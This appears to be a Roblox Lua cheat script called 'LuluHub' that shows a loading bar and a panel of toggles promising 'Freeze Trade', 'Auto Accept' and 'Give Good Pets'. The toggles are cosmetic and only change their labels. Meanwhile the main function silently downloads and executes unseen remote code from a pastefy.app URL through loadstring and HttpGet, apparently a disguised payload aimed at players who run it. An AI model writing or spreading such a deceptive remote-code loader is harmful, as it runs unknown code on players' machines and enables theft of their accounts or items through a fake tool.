-- LuluHub Loading Screen + UI
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
bg.Parent = loadingGui

local title = Instance.new("TextLabel")
title.Text = "LuluHub"
title.Font = Enum.Font.SourceSansBold
title.TextColor3 = Color3.fromRGB(255, 140, 0)
title.TextSize = 48
title.AnchorPoint = Vector2.new(0.5, 0)
title.Position = UDim2.new(0.5, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.Parent = bg

local titleOutline = Instance.new("UIStroke")
titleOutline.Color = Color3.fromRGB(0, 0, 0)
titleOutline.Thickness = 2
titleOutline.Parent = title

local barFrame = Instance.new("Frame")
barFrame.Size = UDim2.new(0.4, 0, 0, 10)
barFrame.Position = UDim2.new(0.3, 0, 0.5, 0)
barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barFrame.BorderSizePixel = 0
barFrame.Parent = bg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
barFill.BorderSizePixel = 0
barFill.Parent = barFrame

local loadingText = Instance.new("TextLabel")
loadingText.Text = "Loading..."
loadingText.Font = Enum.Font.SourceSans
loadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
loadingText.TextSize = 24
loadingText.AnchorPoint = Vector2.new(0.5, 0)
loadingText.Position = UDim2.new(0.5, 0, 0.6, 0)
loadingText.BackgroundTransparency = 1
loadingText.Parent = bg

local function main()
    local scriptLoaded = false
    local loadSuccess, loadError = pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/vwB91OLj/raw", true))()
        scriptLoaded = true
    end)

    local animationDuration = 3
    local startTime = tick()
    local lastPercent = 0

    while true do
        local elapsed = tick() - startTime
        local progress = math.min(elapsed/animationDuration, 1)
        local currentPercent = math.floor(progress*100)

        if currentPercent ~= lastPercent then
            barFill.Size = UDim2.new(progress, 0, 1, 0)
            loadingText.Text = "Loading... "..currentPercent.."%"
            lastPercent = currentPercent
        end

        if progress >= 1 and scriptLoaded then break end
        task.wait(0.03)
    end

    barFill.Size = UDim2.new(1, 0, 1, 0)
    loadingText.Text = "Loading... 100%"
    task.wait(0.5)

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LuluHubUI"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 200, 0, 160)
    mainFrame.Position = UDim2.new(0.7, 0, 0.3, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = screenGui

    local outline = Instance.new("UIStroke")
    outline.Thickness = 2
    outline.Color = Color3.fromRGB(255, 140, 0)
    outline.Parent = mainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame

    -- Orange Title with Orange Outline
    local uiTitle = Instance.new("TextLabel")
    uiTitle.Size = UDim2.new(1, 0, 0, 30)
    uiTitle.BackgroundTransparency = 1
    uiTitle.Text = "LuluHub"
    uiTitle.Font = Enum.Font.SourceSansBold
    uiTitle.TextSize = 20
    uiTitle.TextColor3 = Color3.fromRGB(255, 140, 0) -- Orange text
    uiTitle.Parent = mainFrame
    
    -- Orange outline for title
    local uiTitleOutline = Instance.new("UIStroke")
    uiTitleOutline.Color = Color3.fromRGB(255, 165, 0) -- Brighter orange outline
    uiTitleOutline.Thickness = 2
    uiTitleOutline.Transparency = 0.3
    uiTitleOutline.Parent = uiTitle
    
    -- Optional glow effect (uncomment to use)
    --[[
    local uiTitleGlow = Instance.new("UIGradient")
    uiTitleGlow.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 165, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 140, 0))
    })
    uiTitleGlow.Rotation = 90
    uiTitleGlow.Parent = uiTitle
    --]]

    local function createToggle(name, yPos)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -20, 0, 30)
        btn.Position = UDim2.new(0, 10, 0, yPos)
        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        btn.Text = name..": OFF"
        btn.Font = Enum.Font.SourceSans
        btn.TextSize = 18
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.AutoButtonColor = true
        btn.Parent = mainFrame

        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn

        btn.MouseButton1Click:Connect(function()
            if btn.Text:find("OFF") then
                btn.Text = name..": ON"
                btn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
            else
                btn.Text = name..": OFF"
                btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            end
        end)
    end

    createToggle("Freeze Trade", 40)
    createToggle("Auto Accept", 75)
    createToggle("Give Good Pets", 110)

    for i = 0, 1, 0.05 do
        bg.BackgroundTransparency = i
        title.TextTransparency = i
        loadingText.TextTransparency = i
        barFrame.BackgroundTransparency = i
        barFill.BackgroundTransparency = i
        task.wait(0.03)
    end

    loadingGui:Destroy()
    if not loadSuccess then warn("LuluHub Error: "..tostring(loadError)) end
end

main()
